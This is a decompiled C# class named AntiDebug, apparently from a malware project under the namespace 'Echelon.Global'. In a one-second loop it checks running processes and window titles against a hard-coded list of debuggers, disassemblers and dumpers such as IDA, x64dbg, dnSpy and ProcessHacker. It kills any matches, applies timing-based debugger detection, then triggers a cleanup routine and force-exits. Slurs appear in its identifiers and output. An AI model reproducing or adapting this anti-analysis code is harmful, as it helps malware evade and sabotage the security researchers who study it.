using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using Echelon.Global.Protect;

namespace Echelon.Global
{
	// Token: 0x02000041 RID: 65
	internal class AntiDebug
	{
		// Token: 0x06000185 RID: 389 RVA: 0x0000BED8 File Offset: 0x0000A0D8
		public static void StartAn()
		{
			for (;;)
			{
				AntiDebug.ScanAndKill();
				if (DebugProtect1.PerformChecks() == 1)
				{
					AntiDebug.badExit();
				}
				if (DebugProtect2.PerformChecks() == 1)
				{
					AntiDebug.badExit();
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x0000BF0C File Offset: 0x0000A10C
		public static void ScanAndKill()
		{
			if (AntiDebug.Scan(true) != 0)
			{
				AntiDebug.badExit();
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x0000BF20 File Offset: 0x0000A120
		public static bool inDebugger()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000188 RID: 392 RVA: 0x0000BF80 File Offset: 0x0000A180
		public static void badExit()
		{
			if (Program.debugExit)
			{
				Clean.GetClean();
				Environment.FailFast("fuck you");
			}
		}

		// Token: 0x06000189 RID: 393 RVA: 0x0000BF9C File Offset: 0x0000A19C
		private static int Scan(bool KillProcess)
		{
			int result = 0;
			if (AntiDebug.Process_Pidor_List.Count == 0 && AntiDebug.Window_Pidor_List.Count == 0)
			{
				AntiDebug.Init();
			}
			foreach (Process process in Process.GetProcesses())
			{
				if (AntiDebug.Process_Pidor_List.Contains(process.ProcessName) || AntiDebug.Window_Pidor_List.Contains(process.MainWindowTitle))
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("Найден чмошник: " + process.ProcessName);
					result = 1;
					if (KillProcess)
					{
						try
						{
							process.Kill();
						}
						catch
						{
						}
					}
					if (Program.debugExit)
					{
						break;
					}
				}
			}
			return result;
		}

		// Token: 0x0600018A RID: 394 RVA: 0x0000C068 File Offset: 0x0000A268
		private static int Init()
		{
			if (AntiDebug.Process_Pidor_List.Count > 0 && AntiDebug.Window_Pidor_List.Count > 0)
			{
				return 1;
			}
			AntiDebug.Process_Pidor_List.Add("ollydbg");
			AntiDebug.Process_Pidor_List.Add("ida");
			AntiDebug.Process_Pidor_List.Add("ida64");
			AntiDebug.Process_Pidor_List.Add("idag");
			AntiDebug.Process_Pidor_List.Add("idag64");
			AntiDebug.Process_Pidor_List.Add("idaw");
			AntiDebug.Process_Pidor_List.Add("idaw64");
			AntiDebug.Process_Pidor_List.Add("idaq");
			AntiDebug.Process_Pidor_List.Add("idaq64");
			AntiDebug.Process_Pidor_List.Add("idau");
			AntiDebug.Process_Pidor_List.Add("idau64");
			AntiDebug.Process_Pidor_List.Add("scylla");
			AntiDebug.Process_Pidor_List.Add("scylla_x64");
			AntiDebug.Process_Pidor_List.Add("scylla_x86");
			AntiDebug.Process_Pidor_List.Add("protection_id");
			AntiDebug.Process_Pidor_List.Add("x64dbg");
			AntiDebug.Process_Pidor_List.Add("x32dbg");
			AntiDebug.Process_Pidor_List.Add("windbg");
			AntiDebug.Process_Pidor_List.Add("reshacker");
			AntiDebug.Process_Pidor_List.Add("ImportREC");
			AntiDebug.Process_Pidor_List.Add("IMMUNITYDEBUGGER");
			AntiDebug.Process_Pidor_List.Add("MegaDumper");
			AntiDebug.Process_Pidor_List.Add("4fr33");
			AntiDebug.Process_Pidor_List.Add("HTTPAnalyzerStdV7");
			AntiDebug.Process_Pidor_List.Add("ProcessHacker");
			AntiDebug.Process_Pidor_List.Add("ExtremeDumper");
			AntiDebug.Process_Pidor_List.Add("dnSpy");
			AntiDebug.Process_Pidor_List.Add("dnSpy-x86");
			AntiDebug.Window_Pidor_List.Add("OLLYDBG");
			AntiDebug.Window_Pidor_List.Add("ida");
			AntiDebug.Window_Pidor_List.Add("disassembly");
			AntiDebug.Window_Pidor_List.Add("scylla");
			AntiDebug.Window_Pidor_List.Add("Debug");
			AntiDebug.Window_Pidor_List.Add("[CPU");
			AntiDebug.Window_Pidor_List.Add("Immunity");
			AntiDebug.Window_Pidor_List.Add("WinDbg");
			AntiDebug.Window_Pidor_List.Add("x32dbg");
			AntiDebug.Window_Pidor_List.Add("x64dbg");
			AntiDebug.Window_Pidor_List.Add("Import reconstructor");
			AntiDebug.Window_Pidor_List.Add("MegaDumper");
			AntiDebug.Window_Pidor_List.Add("MegaDumper 1.0 by CodeCracker / SnD");
			return 0;
		}

		// Token: 0x04000088 RID: 136
		private static HashSet<string> Process_Pidor_List = new HashSet<string>();

		// Token: 0x04000089 RID: 137
		private static HashSet<string> Window_Pidor_List = new HashSet<string>();
	}
}
